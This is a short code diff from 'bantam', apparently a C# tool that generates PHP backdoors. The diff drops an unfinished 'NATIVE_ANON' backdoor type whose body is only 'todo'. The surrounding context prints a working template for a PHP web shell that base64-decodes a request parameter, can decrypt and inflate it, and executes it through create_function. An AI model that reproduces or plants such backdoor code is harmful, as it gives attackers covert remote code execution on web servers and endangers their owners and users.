@@ -26,7 +26,6 @@ namespace bantam.Forms
             EVAL = 0,
             ASSERT,
             CREATE_FUNCTION,
-            NATIVE_ANON,
             TMP_INCLUDE,
             PREG_REPLACE
         }
@@ -225,11 +224,6 @@ namespace bantam.Forms
 
                 case BackdoorTypes.CREATE_FUNCTION: {
                         backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$a=@create_function(null, " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t$a();\r\n}";
-                        break;
-                    }
-
-                case BackdoorTypes.NATIVE_ANON: {
-                        backdoorResult = "todo";
                         break;
                     }
 
